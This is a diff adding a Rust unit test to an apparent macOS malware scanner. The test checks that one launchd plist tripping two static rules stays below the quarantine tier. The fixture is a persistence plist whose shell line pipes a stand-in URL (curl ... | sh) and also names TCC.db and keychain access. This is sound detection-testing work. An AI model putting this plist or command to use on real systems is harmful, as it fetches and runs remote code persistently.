@@ -184,6 +184,58 @@ mod tests {
         assert!(!r.signals.iter().any(|s| s.id == "quarantine-xattr-present"));
     }
 
+    /// A single static artifact must not corroborate itself into a high-severity
+    /// verdict: a launchd plist that trips both `launchd-persistence-plist` and
+    /// `suspicious-strings` is two static reads of one file, not two independent
+    /// evidence families, so it stays capped at `Notify` even past the high
+    /// score threshold — both rules now share `StaticSuspicion` (NAV-002).
+    #[test]
+    fn one_static_artifact_cannot_reach_high_severity_alone() {
+        let plist = br#"<plist version="1.0"><dict>
+            <key>Label</key><string>com.x.updater</string>
+            <key>ProgramArguments</key>
+            <array><string>/bin/sh</string><string>-c</string>
+              <string>osascript -e run; curl -s https://x.test/a | sh; sqlite3 TCC.db; SecKeychain</string></array>
+            <key>RunAtLoad</key><true/>
+            <key>KeepAlive</key><true/>
+            <key>StartInterval</key><integer>10</integer>
+        </dict></plist>"#;
+        let r = scan_embedded_bytes(
+            "com.x.updater.plist",
+            plist.to_vec(),
+            false,
+            &default_ruleset(),
+        );
+
+        assert!(r
+            .signals
+            .iter()
+            .any(|s| s.id == "launchd-persistence-plist"));
+        assert!(r.signals.iter().any(|s| s.id == "suspicious-strings"));
+        assert!(
+            r.score >= HIGH_SCORE_THRESHOLD,
+            "score {} must clear the high threshold for this test to be meaningful",
+            r.score
+        );
+
+        let categories: HashSet<SignalCategory> = r
+            .signals
+            .iter()
+            .filter(|s| s.category != SignalCategory::Informational)
+            .map(|s| s.category)
+            .collect();
+        assert_eq!(
+            categories.len(),
+            1,
+            "two static rules on one artifact must not present as independent families: {categories:?}"
+        );
+        assert_ne!(
+            r.recommendation,
+            Recommendation::NotifyAndSuggestQuarantine,
+            "one static artifact must not reach the quarantine tier on category diversity alone"
+        );
+    }
+
     /// Truncation alone downgrades completeness: a readable file examined only
     /// up to the content cap is `Partial`, never `Complete`, even when no rule
     /// objected — otherwise content placed past the read boundary reads as
